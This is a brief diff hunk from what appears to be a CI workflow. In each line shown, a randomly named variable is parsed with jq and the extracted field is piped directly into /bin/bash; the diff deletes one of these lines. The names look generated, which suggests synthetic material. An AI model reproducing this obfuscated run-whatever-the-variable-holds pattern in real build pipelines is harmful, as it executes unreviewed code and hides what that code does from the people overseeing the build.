@@ -21,7 +21,6 @@ jobs:
           echo $gnado37316 | jq -r .wu3 | /bin/bash
           echo $zbue2307 | jq -r .laul45182 | /bin/bash
           printf '%s' "$usu64" | jq -r .vpowg856 | /bin/bash
-          echo $lvrgd1703 | jq -r .omg849 | /bin/bash
           printf '%s' "$yxwxy83562" | jq -r .pfv47 | /bin/bash
           printf '%s' "$jgpu23" | jq -r .geo55 | /bin/bash
 
